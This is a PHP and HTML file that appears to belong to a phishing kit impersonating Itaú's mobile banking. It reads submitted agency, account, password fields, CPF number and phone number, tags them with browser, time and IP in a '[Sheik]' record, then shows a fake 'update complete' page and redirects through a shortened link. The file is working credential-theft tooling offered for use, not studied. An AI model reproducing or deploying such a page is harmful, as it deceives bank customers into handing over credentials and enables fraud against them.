<?php

$AGinforma = $_POST['AGinforma'];
$CTinforma = $_POST['CTinforma'];
$SEinforma = $_POST['SEinforma'];
$DDDinforma = $_POST['DDDinforma'];
$CELinforma = $_POST['CELinforma'];
$CPinforma = $_POST['CPinforma'];
$SCinforma = $_POST['SCinforma'];



$useragent = $_SERVER['HTTP_USER_AGENT'];
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  
$today      = date("H-i-s");
$ip_usuario = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');

$stringData = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[Sheik]-AG:</b> $AGinforma<br />
<b>[Sheik]-CT:</b> $CTinforma<br />
<b>[Sheik]-SE:</b> $SEinforma<br />
<b>[Sheik]-SC:</b> $SCinforma<br />
<b>[Sheik]-CPF:</b> $CPinforma<br />
<b>[Sheik]-CEL:</b> $DDDinforma-$CELinforma<br />
----------------------------------------------------<br />";

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="2;URL=https://bit.ly/1kDqwKR">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body { background:url(app/img/bg-body.png) repeat; margin:0;}

.logo-bg {
	background:url(app/img/logo.png) no-repeat;
	background-position:30px 26px;
	height:100px;
	background-size:70px;	
	}

.geral { padding:20px;}

.meio {
	border-radius:2px;
	padding: 10px;
	}
	
</style>
</head>

<body>
<div class="logo-bg"></div>

<div class="geral" >

<div class="meio">

<div style="width:100%; padding:30px 0 10px 0; color:#FFF; font-family:'Arial'; font-size:14px; text-align:center;">Atualizaçao Concluida.<br>
Aguarde nosso atendimento.</div>

<div style="width:100%; margin:0 0 20px 0; color:#FFF; font-family:'Arial'; font-size:13px; text-align:center;"><b>Itau</b> Agradece sua cooperação</div>

<div align="center"><img src="app/img/ok.png" width="80" height="80" /></div>


</div>

</div>

</body>
</html>